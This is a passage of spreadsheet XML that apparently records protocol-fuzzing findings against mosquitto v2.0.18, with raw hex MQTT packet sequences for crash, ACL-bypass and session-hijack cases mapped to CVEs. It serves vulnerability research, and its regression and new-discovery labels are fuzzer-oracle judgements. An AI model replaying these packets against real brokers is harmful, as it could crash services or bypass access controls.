      <c r="A129" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_2.tar.gz/replayable-violations/id:000009,sev:4,cat:0244</t>
        </is>
      </c>
      <c r="B129" s="2" t="inlineStr">
        <is>
          <t>NULL指针解引用漏洞 - SUBSCRIBE零长度主题过滤器</t>
        </is>
      </c>
      <c r="C129" s="2" t="inlineStr">
        <is>
          <t>CVE-2019-5432 (同类回归: mosquitto v1.5.x/v1.6.x零长度主题过滤器NULL解引用在v2.0.18重新出现)</t>
        </is>
      </c>
      <c r="D1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DATA提取出来(518B)\u000a4.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Sev4\u000a- 违规类别代码: 0x0244\u000a- Fuzzing验证: 10组独立实验,749个独立种子验证稳定性\u000a- Docker独立复现: 已确认协议安全属性违规</t>
        </is>
      </c>
      <c r="E129" s="2">
        <f>== 种子标识: id:000009,sev:4,cat:0244 ===\u000a大小: 2037B (报告+请求数据)\u000a请求数据: 518B\u000a\u000a---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MQTT请求序列(518B原始二进制) ---\u000aMsg[1]: SUBSCRIBE PacketID=32640 Topics=[''(零长度!QoS=0)] | raw_header=82127f80000054540402003c3c3c3c3c\u000aMsg[2]: PUBLISH Topic='?' QoS=2 retain=False payload='' | raw_header=3c3c3c3c3c3c3c3c3c3c3c3c3c3c3c3c\u000aMsg[3]: PUBLISH Topic='?' QoS=2 retain=False payload='' | raw_header=3c3c3c3c3c3c3c3c3c3c3c3c3c3c3c3c\u000aMsg[4]: PUBLISH Topic='?' QoS=2 retain=False payload='' | raw_header=3c3c3c3c3c3c3c3c3c3c3c3c3c3c3c3c\u000aMsg[5]: PUBLISH Topic='?' QoS=2 retain=False payload='' | raw_header=3c3c3c3c643c3c3c3c3c3c3c3c3c3c3c\u000aMsg[6]: PUBLISH Topic='?' QoS=2 retain=False payload='' | raw_header=3c3c3c3c3ce0228d201142d4d0062600\u000aMsg[7]: PUBLISH Topic='?' QoS=2 retain=False payload='' | raw_header=3c193c3c3c3c3c3c3c3c3c3c3c3c3c3c\u000aMsg[8]: PUBLISH Topic='?' QoS=2 retain=False payload='' | raw_header=3c3c3c3c3c3c3c3c7c3c3c3c3c3c3c3c\u000aMsg[9]: PUBLISH Topic='?' QoS=2 retain=False payload='' | raw_header=3c3c3c3c3c3c3c3c3c3c3c3c3c3c3c3c\u000aMsg[10]: (不完整,37B) raw=3c3c3c3c3c3c3c3c3c3c3c3c3c3c3c3c3c3c3c3c3c3c3c3c3c100000007a7a5f63440c5d30\u000a(尾部37B): 3c3c3c3c3c3c3c3c3c3c3c3c3c3c3c3c3c3c3c3c3c3c3c3c3c100000007a7a5f63440c5d30</f>
        <v/>
      </c>
      <c r="F1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9" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(可导致服务器崩溃风险)</t>
        </is>
      </c>
      <c r="J1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2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0">
      <c r="A130" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_2.tar.gz/replayable-violations/id:000009,sev:4,cat:0246</t>
        </is>
      </c>
      <c r="B130" s="2" t="inlineStr">
        <is>
          <t>ACL绕过漏洞 - PUBLISH到$SYS系统主题</t>
        </is>
      </c>
      <c r="C130" s="2" t="inlineStr">
        <is>
          <t>CVE-2017-7650 (同类回归: mosquitto v1.4.x/v1.5.x $SYS主题ACL绕过在v2.0.18重新出现)</t>
        </is>
      </c>
      <c r="D1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DATA提取出来(98B)\u000a4.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0x0246\u000a- Fuzzing验证: 10组独立实验,749个独立种子验证稳定性\u000a- Docker独立复现: 已确认协议安全属性违规</t>
        </is>
      </c>
      <c r="E130" s="2">
        <f>== 种子标识: id:000009,sev:4,cat:0246 ===\u000a大小: 952B (报告+请求数据)\u000a请求数据: 98B\u000a\u000a---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MQTT请求序列(98B原始二进制) ---\u000aMsg[1]: SUBSCRIBE PacketID=1243 Topics=[''(零长度!QoS=0)] | raw_header=821d04db00000017ff6172832f677270\u000aMsg[2]: (不完整,67B) raw=746573742f2b000b73656e736f722f74656d70c0003017001173656e73e01c981a115a52c3351c00\u000a(尾部67B): 746573742f2b000b73656e736f722f74656d70c0003017001173656e73e01c981a115a52c3351c0012686f6d652f2b2f7465</f>
        <v/>
      </c>
      <c r="F1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0" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(协议安全属性违规)</t>
        </is>
      </c>
      <c r="J1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31">
      <c r="A131" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_2.tar.gz/replayable-violations/id:000009,sev:4,cat:02c4</t>
        </is>
      </c>
      <c r="B131" s="2" t="inlineStr">
        <is>
          <t>NULL指针解引用漏洞 - SUBSCRIBE零长度主题过滤器</t>
        </is>
      </c>
      <c r="C131" s="2" t="inlineStr">
        <is>
          <t>CVE-2019-5432 (同类回归: mosquitto v1.5.x/v1.6.x零长度主题过滤器NULL解引用在v2.0.18重新出现)</t>
        </is>
      </c>
      <c r="D1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DATA提取出来(553B)\u000a4.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31" s="2">
        <f>== 种子标识: id:000009,sev:4,cat:02c4 ===\u000a大小: 1280B (报告+请求数据)\u000a请求数据: 553B\u000a\u000a---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MQTT请求序列(553B原始二进制) ---\u000aMsg[1]: SUBSCRIBE PacketID=1 Topics=[''(零长度!QoS=0), ''(零长度!QoS=3)] | raw_header=821200010000100000736f722f2b2f00\u000aMsg[2]: PUBLISH Topic='?' QoS=1 retain=True payload='' | raw_header=33c000820b00010006746573742f2302\u000aMsg[3]: (不完整,466B) raw=eeeeeeeeeeeeeeeeeeeeee1300044d5154540402003ceeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeee\u000a(尾部466B): eeeeeeeeeeeeeeeeeeeeee1300044d5154540402003ceeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeee</f>
        <v/>
      </c>
      <c r="F1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1" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(可导致服务器崩溃风险)</t>
        </is>
      </c>
      <c r="J1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3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2">
      <c r="A132" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_2.tar.gz/replayable-violations/id:000009,sev:4,cat:02c6</t>
        </is>
      </c>
      <c r="B132" s="2" t="inlineStr">
        <is>
          <t>ACL绕过漏洞 - PUBLISH到$SYS系统主题</t>
        </is>
      </c>
      <c r="C132" s="2" t="inlineStr">
        <is>
          <t>CVE-2017-7650 (同类回归: mosquitto v1.4.x/v1.5.x $SYS主题ACL绕过在v2.0.18重新出现)</t>
        </is>
      </c>
      <c r="D1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DATA提取出来(78B)\u000a4.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32" s="2">
        <f>== 种子标识: id:000009,sev:4,cat:02c6 ===\u000a大小: 1119B (报告+请求数据)\u000a请求数据: 78B\u000a\u000a---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MQTT请求序列(78B原始二进制) ---\u000aMsg[1]: SUBSCRIBE PacketID=178 Topics=['a/b/c/d/e'(QoS=0), '$share/grp2/sensor/#'(QoS=0), ''(零长度!QoS=0)] | raw_header=822800b20009612f622f632f642f6500\u000aMsg[2]: PUBLISH Topic='$share/grp/test/topic' QoS=1 retain=True payload='\x00³ì§\x0c\x1d|wÙI' | raw_header=3b2100152473686172652f6772702f74\u000aMsg[3]: CONNECT  | raw_header=13</f>
        <v/>
      </c>
      <c r="F1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2" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(协议安全属性违规)</t>
        </is>
      </c>
      <c r="J1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3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33">
      <c r="A133" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_3.tar.gz/replayable-violations/id:000004,sev:4,cat:0040</t>
        </is>
      </c>
      <c r="B133" s="2" t="inlineStr">
        <is>
          <t>NULL指针解引用漏洞 - SUBSCRIBE零长度主题过滤器</t>
        </is>
      </c>
      <c r="C133" s="2" t="inlineStr">
        <is>
          <t>CVE-2019-5432 (同类回归: mosquitto v1.5.x/v1.6.x零长度主题过滤器NULL解引用在v2.0.18重新出现)</t>
        </is>
      </c>
      <c r="D1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DATA提取出来(51B)\u000a4.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33" s="2">
        <f>== 种子标识: id:000004,sev:4,cat:0040 ===\u000a大小: 427B (报告+请求数据)\u000a请求数据: 51B\u000a\u000a--- 检测到的协议Oracle违规 ---\u000a【Sev4】MQTT: SUBSCRIBE with zero-length topic filter (broker crash risk) (Cat=0x0040 Hash=0x2b06a199 CVE=CVE-2019-5432)\u000a\u000a--- MQTT请求序列(51B原始二进制) ---\u000aMsg[1]: CONNACK  | raw_header=2000\u000aMsg[2]: SUBSCRIBE PacketID=526 Topics=['$share/grp1/#'(QoS=0), ''(零长度!QoS=1)] | raw_header=8215020e000d2473686172652f677270\u000aMsg[3]: PUBLISH Topic='$share/grp/test/topic' QoS=0 retain=False payload='' | raw_header=301700152473686172652f6772702f74\u000aMsg[4]: TYPE0  | raw_header=01</f>
        <v/>
      </c>
      <c r="F1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3" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(可导致服务器崩溃风险)</t>
        </is>
      </c>
      <c r="J13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3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4">
      <c r="A134" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_3.tar.gz/replayable-violations/id:000004,sev:4,cat:00c0</t>
        </is>
      </c>
      <c r="B134" s="2" t="inlineStr">
        <is>
          <t>NULL指针解引用漏洞 - SUBSCRIBE零长度主题过滤器</t>
        </is>
      </c>
      <c r="C134" s="2" t="inlineStr">
        <is>
          <t>CVE-2019-5432 (同类回归: mosquitto v1.5.x/v1.6.x零长度主题过滤器NULL解引用在v2.0.18重新出现)</t>
        </is>
      </c>
      <c r="D1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将种子文件(id:000004,sev:4,cat:00c0)中的REQUEST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34" s="2">
        <f>== 种子标识: id:000004,sev:4,cat:00c0 ===\u000a大小: 632B (报告+请求数据)\u000a请求数据: 69B\u000a\u000a---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MQTT请求序列(69B原始二进制) ---\u000aMsg[1]: SUBSCRIBE PacketID=4129 Topics=[''(零长度!QoS=0)] | raw_header=82051021000000\u000aMsg[2]: PUBLISH Topic='$share/g3/home/+/temperature' QoS=2 retain=True payload='\x10"dF¤_yo\x89Ws*¾\x19Â@ÕeaÀ×¤pÀ"Ú±\x12ç' | raw_header=3d3b001c2473686172652f67332f686f\u000aMsg[3]: SUBACK  | raw_header=90</f>
        <v/>
      </c>
      <c r="F1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4" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(可导致服务器崩溃风险)</t>
        </is>
      </c>
      <c r="J13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3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5">
      <c r="A135" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_3.tar.gz/replayable-violations/id:000004,sev:4,cat:0244</t>
        </is>
      </c>
      <c r="B135" s="2" t="inlineStr">
        <is>
          <t>NULL指针解引用漏洞 - SUBSCRIBE零长度主题过滤器</t>
        </is>
      </c>
      <c r="C135" s="2" t="inlineStr">
        <is>
          <t>CVE-2019-5432 (同类回归: mosquitto v1.5.x/v1.6.x零长度主题过滤器NULL解引用在v2.0.18重新出现)</t>
        </is>
      </c>
      <c r="D1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将种子文件(id:000004,sev:4,cat:0244)中的REQUEST DATA提取出来(77B)\u000a4.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35" s="2">
        <f>== 种子标识: id:000004,sev:4,cat:0244 ===\u000a大小: 616B (报告+请求数据)\u000a请求数据: 77B\u000a\u000a---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MQTT请求序列(77B原始二进制) ---\u000aMsg[1]: SUBSCRIBE PacketID=2130 Topics=['$share/grp1/test/+'(QoS=2), ''(零长度!QoS=1)] | raw_header=821a085200122473686172652f677270\u000aMsg[2]: PUBLISH Topic='+/data' QoS=1 retain=False payload='\x08S¦Ifâ\x1f;Y°Ù70q÷dÏÜd#Ñ½?M§g&lt;j{\x921áö×*\¹I' | raw_header=3a2e00062b2f646174610853a64966e2\u000aMsg[3]: PUBCOMP  | raw_header=70</f>
        <v/>
      </c>
      <c r="F1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5" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(可导致服务器崩溃风险)</t>
        </is>
      </c>
      <c r="J13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3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6">
      <c r="A136" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_3.tar.gz/replayable-violations/id:000005,sev:3,cat:0002</t>
        </is>
      </c>
      <c r="B136" s="2" t="inlineStr">
        <is>
          <t>ACL绕过漏洞 - PUBLISH到$SYS系统主题</t>
        </is>
      </c>
      <c r="C136" s="2" t="inlineStr">
        <is>
          <t>CVE-2017-7650 (同类回归: mosquitto v1.4.x/v1.5.x $SYS主题ACL绕过在v2.0.18重新出现)</t>
        </is>
      </c>
      <c r="D1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DATA提取出来(193B)\u000a4.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36" s="2">
        <f>== 种子标识: id:000005,sev:3,cat:0002 ===\u000a大小: 518B (报告+请求数据)\u000a请求数据: 193B\u000a\u000a--- 检测到的协议Oracle违规 ---\u000a【Sev3】MQTT: PUBLISH to $SYS topic (ACL bypass) (Cat=0x0002 Hash=0x06a9cae1 CVE=N/A)\u000a\u000a--- MQTT请求序列(193B原始二进制) ---\u000aMsg[1]: SUBSCRIBE  | raw_header=8200\u000aMsg[2]: SUBSCRIBE PacketID=41 Topics=[] | raw_header=826300291026000a746573742f746f70\u000aMsg[3]: PUBLISH Topic='$SYS/broker/version' QoS=1 retain=False payload='\x00*\x07\x01\x83\x02PÉº\x8ek\x93!\\x9b\u000ddÝâÛýÎ\x18ÛS÷1»p\x17\x90' | raw_header=32340013245359532f62726f6b65722f\u000aMsg[4]: TYPE0  | raw_header=0000\u000aMsg[5]: TYPE0  | raw_header=0106652000000106\u000aMsg[6]: (不完整,26B) raw=10540402183c0007660a737a5f10540402183c0007660a657a5f\u000a(尾部26B): 10540402183c0007660a737a5f10540402183c0007660a657a5f</f>
        <v/>
      </c>
      <c r="F1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6" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(协议安全属性违规)</t>
        </is>
      </c>
      <c r="J1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37">
      <c r="A137" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_3.tar.gz/replayable-violations/id:000005,sev:3,cat:0082</t>
        </is>
      </c>
      <c r="B137" s="2" t="inlineStr">
        <is>
          <t>ACL绕过漏洞 - PUBLISH到$SYS系统主题</t>
        </is>
      </c>
      <c r="C137" s="2" t="inlineStr">
        <is>
          <t>CVE-2017-7650 (同类回归: mosquitto v1.4.x/v1.5.x $SYS主题ACL绕过在v2.0.18重新出现)</t>
        </is>
      </c>
      <c r="D1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将种子文件(id:000005,sev:3,cat:0082)中的REQUEST DATA提取出来(116B)\u000a4.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37" s="2">
        <f>== 种子标识: id:000005,sev:3,cat:0082 ===\u000a大小: 628B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MQTT请求序列(116B原始二进制) ---\u000aMsg[1]: (不完整,116B) raw=398271006b320bab8182342600142473686172652f677270322f73656e736f722f23001424736861\u000a(尾部116B): 398271006b320bab8182342600142473686172652f677270322f73656e736f722f2300142473686172652f677270322f7365</f>
        <v/>
      </c>
      <c r="F1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7" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(协议安全属性违规)</t>
        </is>
      </c>
      <c r="J1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38">
      <c r="A138" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_3.tar.gz/replayable-violations/id:000005,sev:4,cat:0040</t>
        </is>
      </c>
      <c r="B138" s="2" t="inlineStr">
        <is>
          <t>NULL指针解引用漏洞 - SUBSCRIBE零长度主题过滤器</t>
        </is>
      </c>
      <c r="C138" s="2" t="inlineStr">
        <is>
          <t>CVE-2019-5432 (同类回归: mosquitto v1.5.x/v1.6.x零长度主题过滤器NULL解引用在v2.0.18重新出现)</t>
        </is>
      </c>
      <c r="D1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DATA提取出来(138B)\u000a4.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38" s="2">
        <f>== 种子标识: id:000005,sev:4,cat:0040 ===\u000a大小: 515B (报告+请求数据)\u000a请求数据: 138B\u000a\u000a--- 检测到的协议Oracle违规 ---\u000a【Sev4】MQTT: SUBSCRIBE with zero-length topic filter (broker crash risk) (Cat=0x0040 Hash=0x2b06a199 CVE=CVE-2019-5432)\u000a\u000a--- MQTT请求序列(138B原始二进制) ---\u000aMsg[1]: SUBSCRIBE PacketID=144 Topics=[''(零长度!QoS=1)] | raw_header=820a0090000001740e00001c\u000aMsg[2]: PUBLISH Topic='$share/g3/home/+/temperature' QoS=0 retain=False payload_len=90B | raw_header=3878001c2473686172652f67332f686f\u000aMsg[3]: TYPE0  | raw_header=0002007f</f>
        <v/>
      </c>
      <c r="F1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8" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(可导致服务器崩溃风险)</t>
        </is>
      </c>
      <c r="J13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3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39">
      <c r="A139" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_3.tar.gz/replayable-violations/id:000006,sev:3,cat:0002</t>
        </is>
      </c>
      <c r="B139" s="2" t="inlineStr">
        <is>
          <t>ACL绕过漏洞 - PUBLISH到$SYS系统主题</t>
        </is>
      </c>
      <c r="C139" s="2" t="inlineStr">
        <is>
          <t>CVE-2017-7650 (同类回归: mosquitto v1.4.x/v1.5.x $SYS主题ACL绕过在v2.0.18重新出现)</t>
        </is>
      </c>
      <c r="D1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DATA提取出来(121B)\u000a4.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39" s="2">
        <f>== 种子标识: id:000006,sev:3,cat:0002 ===\u000a大小: 446B (报告+请求数据)\u000a请求数据: 121B\u000a\u000a--- 检测到的协议Oracle违规 ---\u000a【Sev3】MQTT: PUBLISH to $SYS topic (ACL bypass) (Cat=0x0002 Hash=0x06a9cae1 CVE=N/A)\u000a\u000a--- MQTT请求序列(121B原始二进制) ---\u000aMsg[1]: TYPE0  | raw_header=0100\u000aMsg[2]: TYPE0  | raw_header=0200\u000aMsg[3]: AUTH  | raw_header=ff00\u000aMsg[4]: SUBSCRIBE PacketID=268 Topics=['$share/grp1/#'(QoS=2), 'sensor/temp'(QoS=2), '$SYS/broker/version'(QoS=2)] | raw_header=8236010c000d2473686172652f677270\u000aMsg[5]: PUBLISH Topic='$SYS/broker/clients/connected' QoS=0 retain=False payload='ºÝSýU¡\x95i¿YYy\y\x0f¹Ñ\x92ç' | raw_header=3832001d245359532f62726f6b65722f\u000aMsg[6]: TYPE0  | raw_header=0000\u000aMsg[7]: (不完整,5B) raw=640500ff15\u000a(尾部5B): 640500ff15</f>
        <v/>
      </c>
      <c r="F1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9" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(协议安全属性违规)</t>
        </is>
      </c>
      <c r="J1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3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0">
      <c r="A140" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_3.tar.gz/replayable-violations/id:000006,sev:3,cat:0082</t>
        </is>
      </c>
      <c r="B140" s="2" t="inlineStr">
        <is>
          <t>ACL绕过漏洞 - PUBLISH到$SYS系统主题</t>
        </is>
      </c>
      <c r="C140" s="2" t="inlineStr">
        <is>
          <t>CVE-2017-7650 (同类回归: mosquitto v1.4.x/v1.5.x $SYS主题ACL绕过在v2.0.18重新出现)</t>
        </is>
      </c>
      <c r="D1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DATA提取出来(164B)\u000a4.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40" s="2">
        <f>== 种子标识: id:000006,sev:3,cat:0082 ===\u000a大小: 676B (报告+请求数据)\u000a请求数据: 164B\u000a\u000a---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MQTT请求序列(164B原始二进制) ---\u000aMsg[1]: SUBSCRIBE PacketID=129 Topics=['te\x14À\x00à'(QoS=0)] | raw_header=820b00810006746514c000e000\u000aMsg[2]: TYPE0  | raw_header=06746514c000e0000766757a7a5f6333\u000aMsg[3]: PUBLISH Topic='$SYS/broker/version' QoS=0 retain=True payload='Öj\x99B\x03' | raw_header=311a0013245359532f62726f6b65722f\u000aMsg[4]: (不完整,5B) raw=14c000e000\u000a(尾部5B): 14c000e000</f>
        <v/>
      </c>
      <c r="F1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0" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(协议安全属性违规)</t>
        </is>
      </c>
      <c r="J1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1">
      <c r="A141" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_3.tar.gz/replayable-violations/id:000006,sev:4,cat:0040</t>
        </is>
      </c>
      <c r="B141" s="2" t="inlineStr">
        <is>
          <t>NULL指针解引用漏洞 - SUBSCRIBE零长度主题过滤器</t>
        </is>
      </c>
      <c r="C141" s="2" t="inlineStr">
        <is>
          <t>CVE-2019-5432 (同类回归: mosquitto v1.5.x/v1.6.x零长度主题过滤器NULL解引用在v2.0.18重新出现)</t>
        </is>
      </c>
      <c r="D1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DATA提取出来(56B)\u000a4.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41" s="2">
        <f>== 种子标识: id:000006,sev:4,cat:0040 ===\u000a大小: 432B (报告+请求数据)\u000a请求数据: 56B\u000a\u000a--- 检测到的协议Oracle违规 ---\u000a【Sev4】MQTT: SUBSCRIBE with zero-length topic filter (broker crash risk) (Cat=0x0040 Hash=0x2b06a199 CVE=CVE-2019-5432)\u000a\u000a--- MQTT请求序列(56B原始二进制) ---\u000aMsg[1]: (不完整,56B) raw=827f008300002020f913004d09f903004d092020f100f020191e150005504c41494e160013b11f30\u000a(尾部56B): 827f008300002020f913004d09f903004d092020f100f020191e150005504c41494e160013b11f30d17b394fb5320c59fd92</f>
        <v/>
      </c>
      <c r="F1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41" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(可导致服务器崩溃风险)</t>
        </is>
      </c>
      <c r="J1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4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42">
      <c r="A142" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_3.tar.gz/replayable-violations/id:000007,sev:3,cat:0002</t>
        </is>
      </c>
      <c r="B142" s="2" t="inlineStr">
        <is>
          <t>ACL绕过漏洞 - PUBLISH到$SYS系统主题</t>
        </is>
      </c>
      <c r="C142" s="2" t="inlineStr">
        <is>
          <t>CVE-2017-7650 (同类回归: mosquitto v1.4.x/v1.5.x $SYS主题ACL绕过在v2.0.18重新出现)</t>
        </is>
      </c>
      <c r="D1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DATA提取出来(88B)\u000a4.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42" s="2">
        <f>== 种子标识: id:000007,sev:3,cat:0002 ===\u000a大小: 462B (报告+请求数据)\u000a请求数据: 88B\u000a\u000a--- 检测到的协议Oracle违规 ---\u000a【Sev3】MQTT: PUBLISH to $SYS topic (ACL bypass) (Cat=0x0002 Hash=0x06a9cae1 CVE=N/A)\u000a\u000a--- MQTT请求序列(88B原始二进制) ---\u000aMsg[1]: (不完整,88B) raw=3c8252001719260001230013245359532f62726f6b65722f76657273696f6e001d245359532f6272\u000a(尾部88B): 3c8252001719260001230013245359532f62726f6b65722f76657273696f6e001d245359532f62726f6b65722f636c69656e</f>
        <v/>
      </c>
      <c r="F1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2" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(协议安全属性违规)</t>
        </is>
      </c>
      <c r="J1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3">
      <c r="A143" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_3.tar.gz/replayable-violations/id:000007,sev:3,cat:0082</t>
        </is>
      </c>
      <c r="B143" s="2" t="inlineStr">
        <is>
          <t>ACL绕过漏洞 - PUBLISH到$SYS系统主题</t>
        </is>
      </c>
      <c r="C143" s="2" t="inlineStr">
        <is>
          <t>CVE-2017-7650 (同类回归: mosquitto v1.4.x/v1.5.x $SYS主题ACL绕过在v2.0.18重新出现)</t>
        </is>
      </c>
      <c r="D1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43" s="2">
        <f>== 种子标识: id:000007,sev:3,cat:0082 ===\u000a大小: 1601B (报告+请求数据)\u000a请求数据: 163B\u000a\u000a--- 检测到的协议Oracle违规 ---\u000a【Sev1】MQTT: Retained message (potential resource exhaustion) (Cat=0x0080 Hash=0xc7f41b6e CVE=CVE-2023-3592)\u000a【Sev3】MQTT: PUBLISH to $SYS topic (ACL bypass) (Cat=0x0002 Hash=0x06a9cae1 CVE=N/A)\u000a\u000a--- MQTT请求序列(163B原始二进制) ---\u000aMsg[1]: SUBSCRIBE PacketID=343 Topics=['$share/grp1/#'(QoS=0), '$share/grp2/sensor/#'(QoS=0), '$SYS/broker/version'(QoS=0)] | raw_header=823f0157000d2473686172652f677270\u000aMsg[2]: PUBLISH Topic='$SYS/broker/clients/connected' QoS=2 retain=False payload_len=64B | raw_header=345f001d245359532f62726f6b65722f\u000aMsg[3]: SUBSCRIBE  | raw_header=89</f>
        <v/>
      </c>
      <c r="F1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3" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(协议安全属性违规)</t>
        </is>
      </c>
      <c r="J1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4">
      <c r="A144" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_3.tar.gz/replayable-violations/id:000007,sev:3,cat:0101</t>
        </is>
      </c>
      <c r="B144" s="2" t="inlineStr">
        <is>
          <t>会话劫持漏洞 - 空ClientID配合clean_session=0</t>
        </is>
      </c>
      <c r="C144" s="2" t="inlineStr">
        <is>
          <t>CVE-2014-6116 (同类: mosquitto v1.3.x会话固定漏洞在v2.0.18持续存在)</t>
        </is>
      </c>
      <c r="D1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44" s="2">
        <f>== 种子标识: id:000007,sev:3,cat:0101 ===\u000a大小: 435B (报告+请求数据)\u000a请求数据: 61B\u000a\u000a--- 检测到的协议Oracle违规 ---\u000a【Sev3】MQTT: Empty ClientID with clean_session=0 (session hijack risk) (Cat=0x0101 Hash=0x13f826d0 CVE=CVE-2014-6116)\u000a\u000a--- MQTT请求序列(61B原始二进制) ---\u000aMsg[1]: CONNECT Proto=MQAT v0 ClientID=''(0B) clean_session=False keepalive=0s [持久会话] | raw_header=101500044d5141540000000000000000\u000aMsg[2]: (不完整,38B) raw=003a0f0006746573742f31000268656c6c6f50020202a20a00030006746573742f23c000e000\u000a(尾部38B): 003a0f0006746573742f31000268656c6c6f50020202a20a00030006746573742f23c000e000</f>
        <v/>
      </c>
      <c r="F1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4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44" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(会话安全属性违规)</t>
        </is>
      </c>
      <c r="J14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4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45">
      <c r="A145" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_3.tar.gz/replayable-violations/id:000007,sev:3,cat:0181</t>
        </is>
      </c>
      <c r="B145" s="2" t="inlineStr">
        <is>
          <t>会话劫持漏洞 - 空ClientID配合clean_session=0</t>
        </is>
      </c>
      <c r="C145" s="2" t="inlineStr">
        <is>
          <t>CVE-2014-6116 (同类: mosquitto v1.3.x会话固定漏洞在v2.0.18持续存在)</t>
        </is>
      </c>
      <c r="D1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将种子文件(id:000007,sev:3,cat:0181)中的REQUEST DATA提取出来(20B)\u000a4.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145" s="2">
        <f>== 种子标识: id:000007,sev:3,cat:0181 ===\u000a大小: 1600B (报告+请求数据)\u000a请求数据: 20B\u000a\u000a---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MQTT请求序列(20B原始二进制) ---\u000aMsg[1]: (不完整,20B) raw=10ec00000d746573742f72657461696e6564e000\u000a(尾部20B): 10ec00000d746573742f72657461696e6564e000</f>
        <v/>
      </c>
      <c r="F1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4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45" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(会话安全属性违规)</t>
        </is>
      </c>
      <c r="J14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4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46">
      <c r="A146" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_3.tar.gz/replayable-violations/id:000007,sev:3,cat:0206</t>
        </is>
      </c>
      <c r="B146" s="2" t="inlineStr">
        <is>
          <t>权限提升漏洞 - Will消息目标$SYS系统主题</t>
        </is>
      </c>
      <c r="C146" s="2" t="inlineStr">
        <is>
          <t>N/A (新发现: mosquitto Will消息$SYS主题权限提升,此前无相同CVE)</t>
        </is>
      </c>
      <c r="D1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46" s="2">
        <f>== 种子标识: id:000007,sev:3,cat:0206 ===\u000a大小: 876B (报告+请求数据)\u000a请求数据: 60B\u000a\u000a---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MQTT请求序列(60B原始二进制) ---\u000aMsg[1]: CONNECT Proto=MQTT v4 ClientID='gen_v5_sub'(10B) clean_session=True keepalive=77s Will=YES WillTopic='$SYS/broker/version' [自动清理会话] | raw_header=103900044d5154540406004d000a6765\u000aMsg[2]: PUBREC  | raw_header=58</f>
        <v/>
      </c>
      <c r="F1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1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146" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(权限提升)</t>
        </is>
      </c>
      <c r="J1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1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7">
      <c r="A147" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_3.tar.gz/replayable-violations/id:000007,sev:3,cat:0286</t>
        </is>
      </c>
      <c r="B147" s="2" t="inlineStr">
        <is>
          <t>ACL绕过漏洞 - PUBLISH到$SYS系统主题</t>
        </is>
      </c>
      <c r="C147" s="2" t="inlineStr">
        <is>
          <t>CVE-2017-7650 (同类回归: mosquitto v1.4.x/v1.5.x $SYS主题ACL绕过在v2.0.18重新出现)</t>
        </is>
      </c>
      <c r="D1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DATA提取出来(157B)\u000a4.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147" s="2">
        <f>== 种子标识: id:000007,sev:3,cat:0286 ===\u000a大小: 1141B (报告+请求数据)\u000a请求数据: 157B\u000a\u000a---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MQTT请求序列(157B原始二进制) ---\u000aMsg[1]: (不完整,157B) raw=33fcfc823700540012686f6d652f2b2f74656d706572617475726501001d245359532f62726f6b65\u000a(尾部157B): 33fcfc823700540012686f6d652f2b2f74656d706572617475726501001d245359532f62726f6b65722f636c69656e74732f</f>
        <v/>
      </c>
      <c r="F1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7" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(协议安全属性违规)</t>
        </is>
      </c>
      <c r="J1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8">
      <c r="A148" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_3.tar.gz/replayable-violations/id:000007,sev:3,cat:0386</t>
        </is>
      </c>
      <c r="B148" s="2" t="inlineStr">
        <is>
          <t>ACL绕过漏洞 - PUBLISH到$SYS系统主题</t>
        </is>
      </c>
      <c r="C148" s="2" t="inlineStr">
        <is>
          <t>CVE-2017-7650 (同类回归: mosquitto v1.4.x/v1.5.x $SYS主题ACL绕过在v2.0.18重新出现)</t>
        </is>
      </c>
